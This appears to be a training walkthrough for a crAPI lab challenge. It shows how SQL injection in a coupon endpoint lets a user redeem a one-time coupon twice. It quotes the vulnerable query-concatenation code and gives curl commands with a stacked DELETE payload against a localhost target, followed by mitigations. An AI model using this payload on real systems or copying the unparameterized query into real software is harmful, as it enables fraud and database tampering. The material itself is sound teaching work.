# Challenge 13 — SQL Injection: Redeem an already-claimed coupon

**OWASP API Top 10 mapping:** API8:2023 Security Misconfiguration / Injection  
**crAPI category:** SQL Injection

## Goal

Apply the same coupon code a second time after it has already been claimed, by using SQL injection to remove the claim record from the database.

## Vulnerability

`POST /workshop/api/shop/apply_coupon` checks whether the current user already claimed a coupon by concatenating the coupon code directly into a raw SQL query:

```python
cursor.execute(
    "SELECT coupon_code from applied_coupon WHERE user_id = "
    + str(user.id)
    + " AND coupon_code = '"
    + coupon_request_body["coupon_code"]
    + "'"
)
```

This allows stacked SQL commands. By appending a `DELETE` statement, the attacker can wipe the `applied_coupon` entry for the coupon, then re-apply it normally.

## Exploit steps

### 1. Apply the coupon once

```bash
JWT="<your-jwt>"

curl -s -X POST \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  http://127.0.0.1:8888/workshop/api/shop/apply_coupon \
  -d '{"coupon_code": "TRAC075", "amount": 75}' | python3 -m json.tool
```

Response:

```json
{
  "credit": 1195.0,
  "message": "Coupon successfully applied!"
}
```

### 2. Try to apply it again

```bash
curl -s -X POST \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  http://127.0.0.1:8888/workshop/api/shop/apply_coupon \
  -d '{"coupon_code": "TRAC075", "amount": 75}' | python3 -m json.tool
```

Response:

```json
{
  "message": "TRAC075 Coupon code is already claimed by you!! Please try with another coupon code"
}
```

### 3. Inject SQL to delete the claim record

Save the payload to a file to preserve quotes correctly:

```bash
cat > /tmp/sqli_coupon.json <<'EOF'
{
  "coupon_code": "TRAC075'; DELETE FROM applied_coupon WHERE user_id=4 AND coupon_code='TRAC075'; -- ",
  "amount": 75
}
EOF

curl -s -X POST \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  http://127.0.0.1:8888/workshop/api/shop/apply_coupon \
  -d @/tmp/sqli_coupon.json
```

The backend returns an HTTP 500 because the injected `DELETE` does not return a result set, but the `DELETE` statement still executes.

### 4. Apply the coupon again

```bash
curl -s -X POST \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  http://127.0.0.1:8888/workshop/api/shop/apply_coupon \
  -d '{"coupon_code": "TRAC075", "amount": 75}' | python3 -m json.tool
```

Response:

```json
{
  "credit": 1270.0,
  "message": "Coupon successfully applied!"
}
```

The same coupon was accepted a second time.

## Why this works

- The coupon-code value is concatenated directly into the SQL string without parameterization.
- A stacked `DELETE` statement removes the previously-inserted `applied_coupon` row for that user.
- The subsequent normal request sees no claim record, so the coupon is treated as new.

## Impact

- Unlimited reuse of one-time coupons.
- Arbitrary SQL execution in the workshop database.
- Potential to read, modify, or delete other tables (`user_login`, `user_details`, orders, etc.).

## Mitigation

- Use parameterized queries / prepared statements for every database query.
- Never concatenate user input into raw SQL.
- Apply the principle of least privilege to the database user; avoid giving DDL or write access unless required.
- Log and alert on SQL syntax errors and unusual query patterns.
